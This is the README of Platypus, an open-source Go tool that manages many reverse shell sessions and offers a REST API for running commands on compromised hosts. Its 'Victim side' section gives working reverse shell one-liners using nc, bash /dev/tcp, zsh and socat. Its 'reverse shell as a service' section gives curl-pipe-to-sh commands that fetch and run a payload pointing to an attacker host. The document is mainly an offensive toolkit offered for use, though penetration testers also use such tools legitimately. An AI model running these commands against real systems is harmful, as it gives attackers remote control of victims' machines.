# Platypus

[![GitHub stars](https://img.shields.io/github/stars/WangYihang/Platypus.svg)](https://github.com/WangYihang/Platypus/stargazers)
[![GitHub license](https://img.shields.io/github/license/WangYihang/Platypus.svg)](https://github.com/WangYihang/Platypus)
[![Backers on Open Collective](https://opencollective.com/Platypus/backers/badge.svg)](#backers) 
[![Sponsors on Open Collective](https://opencollective.com/Platypus/sponsors/badge.svg)](#sponsors)

A modern multiple reverse shell sessions/clients manager via terminal written in go

#### Features
- [x] Multiple service listening port
- [x] Multiple client connections
- [x] RESTful API
- [x] Reverse shell as a service

#### Screenshot
![](https://upload-images.jianshu.io/upload_images/2355077-9ef699f1de815f9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![](https://upload-images.jianshu.io/upload_images/2355077-bd729ecfe7d2dcc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

#### Network Topology
```
Attack IP: 192.168.1.2
    Reverse Shell Service: 0.0.0.0:8080
    RESTful Service: 127.0.0.1:9090
Victim IP: 192.168.1.3
```

#### Run Platypus from source code
```
go get github.com/WangYihang/Platypus
cd go/src/github.com/WangYihang/Platypus
go run platypus.go
```

#### Run Platypus from release binaries
```
// Download binary from https://github.com/WangYihang/Platypus/releases
chmod +x ./Platypus_linux_amd64
./Platypus_linux_amd64
```

#### Run Platypus from docker
```
// Build your docker image
docker build -t xxxx/Platypus .

// Use host network mode to run container
docker run --net=host -it xxxx/Platypus

// Don' t use host network, and you need to specify the port manually
docker run -p 8000:8000 -p 9000:9000 xxxx/Platypus
```

#### Victim side
```
nc -e /bin/bash 192.168.1.2 8080
bash -c 'bash -i >/dev/tcp/192.168.1.2/8080 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.1.2 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
```

#### Reverse shell as a Service
```bash
// Platypus is able to multiplexing the reverse shell listening port
// The port 8080 can receive reverse shell client connection
// Also these is a Reverse shell as a service running on this port

// victim will be redirected to attacker-host attacker-port
// sh -c "$(curl http://host:port/attacker-host/attacker-port)"
# curl http://192.168.1.2:8080/attacker.com/1337
bash -c 'bash -i >/dev/tcp/attacker.com/1337 0>&1'
# sh -c "$(curl http://192.168.1.2:8080/attacker.com/1337)"

// if the attacker info not specified, it will use host, port as attacker-host attacker-port
// sh -c "$(curl http://host:port/)"
# curl http://192.168.1.2:8080/
curl http://192.168.1.2:8080/192.168.1.2/8080|sh
# sh -c "$(curl http://host:port/)"
```

#### RESTful API
* `GET /client` List all online clients
```
# curl 'http://127.0.0.1:9090/client'
{
    "msg": [
        "192.168.1.3:54798"
    ],
    "status": true
}
```
* `POST /client/:hash` execute a command on a specific client
```
# curl -X POST 'http://127.0.0.1:9090/client/0723c3bed0d0240140e10a6ffd36eed4' --data 'cmd=whoami'
{
    "status": true,
    "msg": "root\n",
}
```
* How to hash?
```
# echo -n "192.168.1.3:54798" | md5sum
0723c3bed0d0240140e10a6ffd36eed4  -
```

#### TODO
- [ ] [#12 Add capability of setting human-readable name of session](https://github.com/WangYihang/Platypus/issues/12)
- [ ] [#13 Add a display current prompt setting](https://github.com/WangYihang/Platypus/issues/13)
- [ ] [#10 Use database to record all events and interacting logs](https://github.com/WangYihang/Platypus/issues/10)
- [ ] [#11 Make STDOUT and STDERR distinguishable](https://github.com/WangYihang/Platypus/issues/11)
- [ ] [#6 Send one command to all clients at once(Meta Command)](https://github.com/WangYihang/Platypus/issues/6)
- [ ] [#15 Encryption support](https://github.com/WangYihang/Platypus/issues/15)
- [ ] Send a specific command to all clients
- [ ] More interfaces in RESTful API
- [ ] RESTful API should auth
- [ ] Use crontab
- [ ] Use HR package to detect the status of client (maybe `echo $random_string`)
- [ ] Upgrade common reverse shell session into full interactive session
- [ ] Provide full kernel API
- [ ] Upload file
- [ ] Download file
- [ ] List file
- [ ] Web UI
- [ ] User guide
- [ ] Benchmark
- [ ] Upgrade to Metepreter session
- [x] Docker support (Added by [yeya24](https://github.com/yeya24))


## Contributors

This project exists thanks to all the people who contribute. 
<a href="https://github.com/WangYihang/Platypus/graphs/contributors"><img src="https://opencollective.com/Platypus/contributors.svg?width=890&button=false" /></a>


## Backers

Thank you to all our backers! 🙏 [[Become a backer](https://opencollective.com/Platypus#backer)]

<a href="https://opencollective.com/Platypus#backers" target="_blank"><img src="https://opencollective.com/Platypus/backers.svg?width=890"></a>


## Sponsors

Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [[Become a sponsor](https://opencollective.com/Platypus#sponsor)]

<a href="https://opencollective.com/Platypus/sponsor/0/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/0/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/1/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/1/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/2/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/2/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/3/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/3/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/4/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/4/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/5/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/5/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/6/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/6/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/7/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/7/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/8/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/8/avatar.svg"></a>
<a href="https://opencollective.com/Platypus/sponsor/9/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/9/avatar.svg"></a>


